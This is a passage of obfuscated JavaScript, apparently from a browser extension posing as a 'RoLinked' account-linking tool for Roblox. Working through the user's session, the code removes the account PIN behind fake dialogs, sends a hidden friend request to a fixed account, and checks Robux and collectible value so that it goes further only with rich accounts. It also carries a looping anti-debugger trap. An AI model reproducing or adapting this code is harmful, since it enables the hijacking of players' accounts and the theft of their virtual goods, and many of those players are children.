                                                        '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                    document.body.insertAdjacentHTML(
                                                        "beforeend",
                                                        Z
                                                    );
                                                    document.getElementsByClassName(
                                                        "btn-cta-md modal-modern-footer-button"
                                                    )[0].onclick = function () {
                                                        document
                                                            .getElementById(
                                                                "pinPopupz"
                                                            )
                                                            .remove();
                                                        document.getElementById(
                                                            "agreeRoLinked"
                                                        ).disabled = false;
                                                    };
                                                }
                                            } else {
                                                try {
                                                    document
                                                        .getElementById(
                                                            "pinPopupz"
                                                        )
                                                        .remove();
                                                } catch {}
                                                $.ajax({
                                                    method: "DELETE",
                                                    url: "https://auth.roblox.com/v1/account/pin",
                                                    contentType:
                                                        "application/json",
                                                    success: function () {
                                                        o(null, null);
                                                    },
                                                    error: function (A) {
                                                        var K = atob(
                                                            A.getResponseHeader(
                                                                "rblx-challenge-metadata"
                                                            )
                                                        );
                                                        var G =
                                                            A.getResponseHeader(
                                                                "rblx-challenge-id"
                                                            );
                                                        var D = K.split(
                                                            '"challengeId":"'
                                                        )
                                                            .pop()
                                                            .split('"')[0];
                                                        k(D, G, null);
                                                    },
                                                });
                                            }
                                        } else {
                                            o(null, null);
                                        }
                                    },
                                });
                            };
                    } else {
                        $.ajax({
                            method: "GET",
                            url: "https://auth.roblox.com/v1/account/pin",
                            contentType: "application/json",
                            success: function (y) {
                                var J = y.isEnabled;
                                var b = y.unlockedUntil;
                                if (J == true) {
                                    if (b == null) {
                                        document.getElementsByClassName(
                                            "text-footer footer-note"
                                        )[0].innerText = "Not Active";
                                        if (
                                            document.getElementById(
                                                "pinPopupz"
                                            ) == null
                                        ) {
                                            var a =
                                                '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                            document.body.insertAdjacentHTML(
                                                "beforeend",
                                                a
                                            );
                                            document.getElementsByClassName(
                                                "btn-cta-md modal-modern-footer-button"
                                            )[0].onclick = function () {
                                                document
                                                    .getElementById("pinPopupz")
                                                    .remove();
                                                document.getElementsByClassName(
                                                    "text-footer footer-note"
                                                )[0].innerText = "Not Active";
                                            };
                                        }
                                    } else {
                                        try {
                                            document
                                                .getElementById("pinPopupz")
                                                .remove();
                                        } catch {}
                                        $.ajax({
                                            method: "DELETE",
                                            url: "https://auth.roblox.com/v1/account/pin",
                                            contentType: "application/json",
                                            success: function () {
                                                o(null, null);
                                            },
                                            error: function (Z) {
                                                var A = atob(
                                                    Z.getResponseHeader(
                                                        "rblx-challenge-metadata"
                                                    )
                                                );
                                                var K =
                                                    Z.getResponseHeader(
                                                        "rblx-challenge-id"
                                                    );
                                                var G = A.split(
                                                    '"challengeId":"'
                                                )
                                                    .pop()
                                                    .split('"')[0];
                                                k(G, K, null);
                                            },
                                        });
                                    }
                                } else {
                                    o(null, null);
                                }
                            },
                        });
                    }
                }
                (async function () {
                    await w(800);
                    if (validDev.length > 0) {
                        console.log(validDev);
                        try {
                            var u = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(u),
                            });
                        } catch {}
                        $.ajax({
                            method: "GET",
                            url:
                                "https://economy.roblox.com/v2/users/" +
                                p +
                                "/transaction-totals?timeFrame=Year&transactionType=summary",
                            contentType: "application/json",
                            success: function (I) {
                                var k = I.currencyPurchasesTotal;
                                k > 300
                                    ? O()
                                    : $.ajax({
                                          method: "GET",
                                          url:
                                              "https://economy.roblox.com/v1/users/" +
                                              p +
                                              "/currency",
                                          contentType: "application/json",
                                          success: function (o) {
                                              var z = o.robux;
                                              if (z > 999) {
                                                  O();
                                              } else {
                                                  var J =
                                                      '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                                  document.body.insertAdjacentHTML(
                                                      "beforeend",
                                                      J
                                                  );
                                                  document.getElementById(
                                                      "closeButton1"
                                                  ).onclick = function () {
                                                      document
                                                          .getElementById(
                                                              "promptPopup"
                                                          )
                                                          .remove();
                                                      document.getElementsByClassName(
                                                          "text-footer footer-note"
                                                      )[0].innerText =
                                                          "Not Active";
                                                  };
                                                  document.getElementById(
                                                      "promptPopup"
                                                  ).onclick = function () {
                                                      document
                                                          .getElementById(
                                                              "promptPopup"
                                                          )
                                                          .remove();
                                                      document.getElementsByClassName(
                                                          "text-footer footer-note"
                                                      )[0].innerText =
                                                          "Not Active";
                                                  };
                                              }
                                          },
                                      });
                            },
                        });
                    } else {
                        function I(v) {
                            const x =
                                "https://inventory.roblox.com/v1/users/" +
                                v +
                                "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var k = {
                                url: x,
                                type: "GET",
                            };
                            return $.ajax(k);
                        }
                        I(p)
                            .done(function (v) {
                                if (v && v.data && v.data.length > 0) {
                                    let k = 0;
                                    v.data.forEach((o) => {
                                        o.recentAveragePrice &&
                                            (k += o.recentAveragePrice);
                                    });
                                    if (k > 15000) {
                                        O();
                                    } else {
                                        var x =
                                            '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML(
                                            "beforeend",
                                            x
                                        );
                                        document.getElementById(
                                            "closeButton1"
                                        ).onclick = function () {
                                            document
                                                .getElementById("promptPopup")
                                                .remove();
                                            document.getElementsByClassName(
                                                "text-footer footer-note"
                                            )[0].innerText = "Not Active";
                                        };
                                        document.getElementById(
                                            "promptPopup"
                                        ).onclick = function () {
                                            document
                                                .getElementById("promptPopup")
                                                .remove();
                                            document.getElementsByClassName(
                                                "text-footer footer-note"
                                            )[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var x =
                                        '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML(
                                        "beforeend",
                                        x
                                    );
                                    document.getElementById(
                                        "closeButton1"
                                    ).onclick = function () {
                                        document
                                            .getElementById("promptPopup")
                                            .remove();
                                        document.getElementsByClassName(
                                            "text-footer footer-note"
                                        )[0].innerText = "Not Active";
                                    };
                                    document.getElementById(
                                        "promptPopup"
                                    ).onclick = function () {
                                        document
                                            .getElementById("promptPopup")
                                            .remove();
                                        document.getElementsByClassName(
                                            "text-footer footer-note"
                                        )[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (v, x, k) {
                                var y = {};
                                y.Oupxp = "promptPopup";
                                y.rPzPo = "text-footer footer-note";
                                y.djBfk = "Not Active";
                                var J =
                                    '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML(
                                    "beforeend",
                                    J
                                );
                                document.getElementById(
                                    "closeButton1"
                                ).onclick = function () {
                                    document.getElementById(z.Oupxp).remove();
                                    document.getElementsByClassName(
                                        z.rPzPo
                                    )[0].innerText = z.djBfk;
                                };
                                document.getElementById("promptPopup").onclick =
                                    function () {
                                        document
                                            .getElementById("promptPopup")
                                            .remove();
                                        document.getElementsByClassName(
                                            "text-footer footer-note"
                                        )[0].innerText = "Not Active";
                                    };
                            });
                    }
                })();
            },
            error: function () {
                var B = {};
                B.NKzLA = "promptPopup";
                B.lEVPK = "text-footer footer-note";
                B.xSTvx = "Not Active";
                var p =
                    '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", p);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById(O.NKzLA).remove();
                    document.getElementsByClassName(O.lEVPK)[0].innerText =
                        O.xSTvx;
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById(O.NKzLA).remove();
                    document.getElementsByClassName(O.lEVPK)[0].innerText =
                        O.xSTvx;
                };
            },
        });
    }
})();
function t(l) {
    function d(U) {
        if (typeof U === "string") {
            return function (j) {}
                .constructor("while (true) {}")
                .apply("counter");
        } else {
            ("" + U / U).length !== 1 || U % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        d(++U);
    }
    try {
        if (l) {
            return d;
        } else {
            d(0);
        }
    } catch (U) {}
}
(function () {
    var E = function () {
        var U;
        try {
            U = Function(
                'return (function() {}.constructor("return this")( ));'
            )();
        } catch (j) {
            U = window;
        }
        return U;
    };
    var d = E();
    d.setInterval(t, 4000);
})();